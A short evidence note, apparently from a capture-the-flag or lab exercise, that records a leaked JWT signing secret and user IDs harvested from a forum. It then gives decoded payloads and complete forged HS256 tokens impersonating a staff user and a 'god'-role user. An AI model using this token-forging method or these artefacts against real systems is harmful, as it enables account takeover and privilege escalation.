# Evidence — JWT decode / forge

- **Secret (passphrase):** `42network` — leaked in HTML page comments.
- **`sub`** = user ID — obtained via forum → wil's post → his profile URL.

## wil (staff)
```json
{ "alg": "HS256", "typ": "JWT" }
{ "sub": "k1asdfeditojrb4", "login": "will", "role": "staff", "exp": 1790871002 }
```
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJrMWFzZGZlZGl0b2pyYjQiLCJsb2dpbiI6IndpbGwiLCJyb2xlIjoic3RhZmYiLCJleHAiOjE3OTA4NzEwMDJ9.1aWWm7TEUAF2mUb3w1NNrSAKqsvQb5pSzUmBNIEUWo0
```

## sophie (god)
```json
{ "sub": "enplwhu8jfo56oi", "login": "sophie", "role": "god", "exp": 1790871002 }
```
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbnBsd2h1OGpmbzU2b2kiLCJsb2dpbiI6InNvcGhpZSIsInJvbGUiOiJnb2QiLCJleHAiOjE3OTA4NzEwMDJ9.X7OSKsd2xJtp6-He_L76g15n6XGV0hgnZ4HqdvshlEU
```
